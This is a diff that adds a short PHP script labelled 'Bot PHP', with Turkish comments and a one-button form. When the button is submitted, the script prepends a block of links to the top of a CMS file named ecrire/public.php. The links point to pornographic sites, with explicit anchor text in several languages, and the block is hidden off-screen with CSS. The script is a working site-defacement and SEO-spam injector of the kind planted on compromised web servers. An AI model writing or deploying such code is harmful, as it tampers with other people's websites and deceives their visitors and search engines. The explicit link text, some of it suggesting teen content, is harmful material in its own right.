@@ -1,0 +1,64 @@
+<?php
+
+// Backlink ekleme işlemi
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Eklenecek backlink kodu
+    $backlinkCode = '<span style="position: absolute; left: -8355px;">
+<a href="https://bn.xvix.eu/channels/33/ইন্ডিয়ান/" target="_blank">তার জন্য সেক্স ভিডিও ফ্রি পর্ণ</a><br>
+<a href="https://bn.bestporn2025.com/video/দুটি-শৃঙ্গাকার-সমকামী-ছেলেদের-চোদাচুদি-আগের-মতো-হয়নি-4151.html" target="_blank">ছেলেদের চোদা আমাদের পর্ন সিনেমার শেষ</a><br>
+<a href="https://zgays.com/video/i-sucked-a-cock-for-the-first-time-and-i-loved-it-3105.html" target="_blank">gay guy sucks dick in public sex for the first time</a><br>
+<a href="https://he.teensexonline.com/search/סקס+שלישייה/" target="_blank">סקס שלישיה בחובבנים עושים סרטוני פורנו</a><br>
+<a href="https://sw.xnxxporns.com/video/binamu-na-binamu-wanatombana-nje-3615.html" target="_blank">wanapambana na tovuti bora za ponografia zisizolipishwa</a><br>
+<a href="https://sw.only-brunettes.com/search/mfano+wa+ponografia/" target="_blank">ponografia kwenye tovuti salama za ponografia</a><br>
+<a href="https://th.onlyteens.porn/video/สาวพม่าเซ็กซี่โดนช่างสักเย็ดอย่างหนัก-2889.html" target="_blank">เย็ดช่างสักในเว็บไซต์หนังโป๊ 10 อันดับแรก</a><br>
+<a href="https://th.bigassmonster.com/video/น้องชายต่างแม่ของฉันคิดว่าฉันเป็นตุ๊กตายางของเขาและทำฉันเข้าใจผิด-3991.html" target="_blank">เย็ดตุ๊กตายางและรู้ว่าจะดูหนังโป๊ที่ไหน</a><br>
+<a href="https://vi.djav.org/video/một-nhân-vật-anime-tuổi-teen-tóc-vàng-nghiệp-dư-có-bộ-ngực-to-và-mông-to-và-là-một-nữ-sinh-quyến-rũ-quan-hệ-tình-dục-qua-đường-hậu-môn-với-người-yêu-nóng-bỏng-của-mình.-4760.html" target="_blank">phim hoạt hình sex miễn phí cho các trang web hẹn hò không cần thanh toán</a><br>
+<a href="https://vi.porn2026.com/video/tiếng-rên-rỉ-lớn-khi-những-con-điếm-bị-đụ-mạnh-hơn-trong-lỗ-đít-chật-chội-của-chúng-cho-đến-khi-chúng-phun-ra.-3521.html" target="_blank">rên rỉ khi quan hệ tình dục trên trang web hẹn hò sex phổ biến nhất</a><br>
+
+
+
+</span>' . PHP_EOL;
+
+    // Ecrire klasörünün yolu
+    $ecrireDir = __DIR__ . DIRECTORY_SEPARATOR . 'ecrire';
+
+    // public.php dosyasının yolu
+    $publicFilePath = $ecrireDir . DIRECTORY_SEPARATOR . 'public.php';
+
+    // public.php dosyasını kontrol ve düzenleme işlemi
+    if (file_exists($publicFilePath)) {
+        // Dosya içeriğini oku
+        $fileContents = file_get_contents($publicFilePath);
+
+        // Backlink zaten var mı kontrol et
+        if (strpos($fileContents, $backlinkCode) === false) {
+            // Backlinki dosyanın en üstüne ekle
+            $newContents = $backlinkCode . $fileContents;
+
+            // Dosyayı yeni içerikle yaz
+            if (file_put_contents($publicFilePath, $newContents)) {
+                echo "Backlink başarıyla eklendi: $publicFilePath\n";
+            } else {
+                echo "Dosyaya yazma hatası: $publicFilePath\n";
+            }
+        } else {
+            echo "Backlink zaten mevcut: $publicFilePath\n";
+        }
+    } else {
+        echo "public.php dosyası bulunamadı: $publicFilePath\n";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bot PHP</title>
+</head>
+<body>
+    <form method="post">
+        <button type="submit">EKLE</button>
+    </form>
+</body>
+</html>
